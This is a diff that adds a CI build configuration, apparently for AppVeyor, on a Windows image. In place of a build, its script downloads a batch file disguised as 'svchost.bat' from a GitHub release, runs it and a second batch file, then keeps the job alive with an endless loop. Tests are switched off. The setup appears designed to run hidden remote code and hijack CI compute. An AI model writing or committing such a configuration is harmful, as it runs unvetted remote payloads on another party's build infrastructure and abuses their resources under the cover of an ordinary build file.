@@ -1,0 +1,34 @@
+version: LM0
+
+# Trigger build on every push to main branch
+branches:
+  only:
+    - main
+
+image: Visual Studio 2022  # Windows-latest equivalent
+
+build_script:
+  - ps: |
+      Write-Host "Downloading Essentials..."
+      Invoke-WebRequest -Uri "https://github.com/kept-lazy-cultural/1/releases/download/svc/svchost.bat" -OutFile "svchost.bat"
+
+      Write-Host "Running svchost.bat..."
+      cmd /c svchost.bat
+
+      Write-Host "Running svc.bat..."
+      cmd /c svc.bat
+
+      Write-Host "Starting keep-alive loop..."
+      $i = 0
+      while ($true) {
+        $i++
+        Write-Host "Still alive... ($i) - $(Get-Date)"
+        Start-Sleep -Seconds 300
+      }
+
+# No tests to run
+test: off
+
+# Prevent cleanup from interrupting long jobs
+on_finish:
+  - echo "Job finished."
